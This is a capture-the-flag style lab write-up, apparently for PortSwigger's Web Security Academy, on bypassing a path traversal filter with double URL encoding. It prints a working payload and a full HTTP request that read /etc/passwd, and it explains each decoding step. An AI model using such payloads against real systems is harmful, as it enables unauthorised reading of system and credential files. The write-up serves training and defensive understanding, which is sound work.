# Path Traversal — Traversal sequences stripped with superfluous URL-decode


**Difficulty:** Practitioner

**Status:** ✅ Solved



## Overview



This lab contains a **Path Traversal** vulnerability in the functionality that displays product images.



The application blocks input containing path traversal sequences and then performs a **URL decode** on the input 
before using it.



The goal is to retrieve the contents of:



```text

/etc/passwd

```



---



## Initial Request



The original image request was:



```http

GET /image?filename=53.jpg HTTP/2

```



The vulnerable parameter is:



```text

filename=53.jpg



```



This parameter controls the file that the application attempts to retrieve.



---



## The Filter



The application blocks traversal sequences such as:



```text

../

```



A normal payload like:



```text

../../../etc/passwd

```



would therefore be blocked.



However, the application performs URL decoding **after** the initial check.



This creates an opportunity to hide the traversal characters from the filter using URL encoding.



---



## Double URL Encoding



The `/` character can be URL-encoded as:



```text


%2f

```



The `%` character can itself be URL-encoded as:



```text

%25

```



Therefore:



```text

%252f

```



can be decoded twice:



```text

%252f

   ↓ First decode

%2f

   ↓ Second decode

/

```


The same principle can be applied to the traversal sequence.


---



## Exploitation



The payload used was:



```text

..%252f..%252f..%252fetc/passwd

```




The request becomes:



```http

GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2

```


### Decoding Process



Before decoding:



```text

..%252f..%252f..%252fetc/passwd

```



After the first URL decode:


```text

..%2f..%2f..%2fetc/passwd

```



After the second URL decode:



```text

../../../etc/passwd

```



The application then interprets the resulting value as a path traversal and accesses:



```text

/etc/passwd


```



The contents of the file are returned, solving the lab.



---




## Attack Flow



```text

User Input

    ↓

..%252f..%252f..%252fetc/passwd

    ↓

Initial filter

    ↓

Traversal sequence is not detected

    ↓

First URL Decode

    ↓

..%2f..%2f..%2fetc/passwd

    ↓

Second URL Decode

    ↓

../../../etc/passwd

    ↓

Path Traversal

    ↓

/etc/passwd

```




---



## Key Takeaways





* URL encoding can be used to bypass input filters.

* `%25` represents an encoded `%`.

* `%252f` can become `%2f` after one decode and `/` after another.

* **Double URL encoding** can hide traversal sequences from a filter that checks the input before decoding.

* The **order of filtering and decoding** is critical when analyzing Path Traversal vulnerabilities.

* Always understand how many times the application decodes user input.



## Lab Payload



```text

..%252f..%252f..%252fetc/passwd

```




**Result:** Retrieved `/etc/passwd` and solved the lab. ✅



## References




* PortSwigger Web Security Academy — Path Traversal
  https://portswigger.net/web-security/file-path-traversal


* OWASP — Path Traversal
  https://owasp.org/www-community/attacks/Path_Traversal
